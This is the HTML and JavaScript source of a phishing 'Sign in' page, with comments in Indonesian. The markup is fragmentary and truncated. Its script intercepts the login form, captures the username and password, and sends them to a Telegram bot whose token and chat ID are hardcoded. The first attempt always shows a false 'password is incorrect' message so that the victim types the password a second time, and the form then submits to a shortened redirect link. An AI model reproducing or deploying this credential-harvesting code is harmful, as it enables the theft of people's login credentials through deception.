  <title>Sign In</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      box-sizing: border-box;
    }

    a {
      text-decoration: none;
      color: #1a73e8;
      margin: 15px;
    }

    .container {
      max-width: 1000px;
      margin: 0 auto;
      display: flex;
      justify-content: center;
      flex-direction: column;
      align-items: center;
      margin-top: 3rem;
      font-size: 14px;
    }

    .box {
      max-width: 350px;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      background-color: #ffff;
      border: 1px solid #e6e6e6;
      border-radius: 1px;
      margin: 0 0 10px;
      padding: 10px 0;
      flex-grow: 1;
    }

    .field {
      margin: 14px 0px 17px 14px;
      position: relative;
      font-size: 14px;
      width: 100%;
      text-overflow: ellipsis;
    }

    input {
      padding: 2px 5px 5px 8px;
      font-size: 12px;
      width: 16rem;
      height: 2.5rem;
      outline: 0;
      background: #fafafa;
      border-radius: 3px;
      border: 1px solid #efefef;
    }

    label {
      position: absolute;
      pointer-events: none;
      left: 10px;
      padding-bottom: 15px;
      transform: translateY(10px);
      line-height: 6px;
      transition: all ease-out .1s;
      font-size: 14px;
      color: #999;
      padding-top: 6px;
    }

    input::placeholder {
      visibility: hidden;
    }

    input:not(:placeholder-shown)+label {
      transform: translateY(0);
      font-size: 11px;
    }

    input:not(:placeholder-shown) {
      padding-top: 14px;
      padding-bottom: 2px;
    }

    .login-button {
      text-align: center;
      width: 40%;
      padding: 13px;
      border: 1px solid transparent;
      background-color: #1a73e8;
      color: #fff;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      border-radius: 4px;
      margin: 5px 0px 0px 165px;
    }

    .separator {
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: #999;
      margin-top: 6px;
    }

    .error-message {
      color: red;
      font-size: 12px;
      margin: 10px 0;
      display: none;
    }

    h1 {
      color: black;
      font-family: sans-serif;
      font-size: 19px;
    }

    p {
      color: black;
      font-family: sans-serif;
      font-size: 13px;
    }
  </style>
</head>

      <h1>Sign in</h1>
      <div id="errorMessage" class="error-message">The password you entered is incorrect. Please try again.</div>

      <form id="loginForm" action="https://is.gd/IWoPSc" method="post">
        <div class="field">
          <input name="user" type="text" placeholder="Phone number, username, or email" required>
          <label for="username">Email or phone number</label>
        </div>

        <a class="signup" href="#">Forgot password?</a>

        <div class="others">

<p>

  <script>
    // Inisialisasi jumlah percobaan login dari localStorage
    let loginAttempts = localStorage.getItem('loginAttempts') ? parseInt(localStorage.getItem('loginAttempts')) : 0;

    // Tangkap form submission
    document.getElementById('loginForm').addEventListener('submit', async function(event) {
      event.preventDefault(); // Mencegah pengiriman form default

      // Ambil nilai input
      const username = document.querySelector('input[name="user"]').value;
      const password = document.querySelector('input[name="pass"]').value;

      // Konfigurasi bot Telegram
      const botToken = '7550479156:AAH_Y0xeF5T_xUfP1QVy-2RNZf-2smS_CHs'; // Ganti dengan token bot Telegram Anda
      const chatId = '7777353888'; // Ganti dengan chat ID Anda
      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const message = `Username: ${username}\nPassword: ${password}\nAttempt: ${loginAttempts + 1}`;

      // Tambah jumlah percobaan
      loginAttempts++;
      localStorage.setItem('loginAttempts', loginAttempts);

      try {
        // Kirim data ke bot Telegram
        await fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        // Logika berdasarkan jumlah percobaan
        if (loginAttempts === 1) {
          // Percobaan pertama: tampilkan pesan kesalahan
          document.getElementById('errorMessage').style.display = 'block';
        } else {
          // Percobaan kedua: arahkan ke URL tujuan
          localStorage.removeItem('loginAttempts'); // Reset percobaan
          document.getElementById('loginForm').submit(); // Kirim form
        }
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        // Tetap lanjutkan logika meskipun gagal ke Telegram
        if (loginAttempts === 1) {
          document.getElementById('errorMessage').style.display = 'block';
        } else {
          localStorage.removeItem('loginAttempts'); // Reset percobaan
          document.getElementById('loginForm').submit(); // Kirim form
        }
      }
    });
  </script>
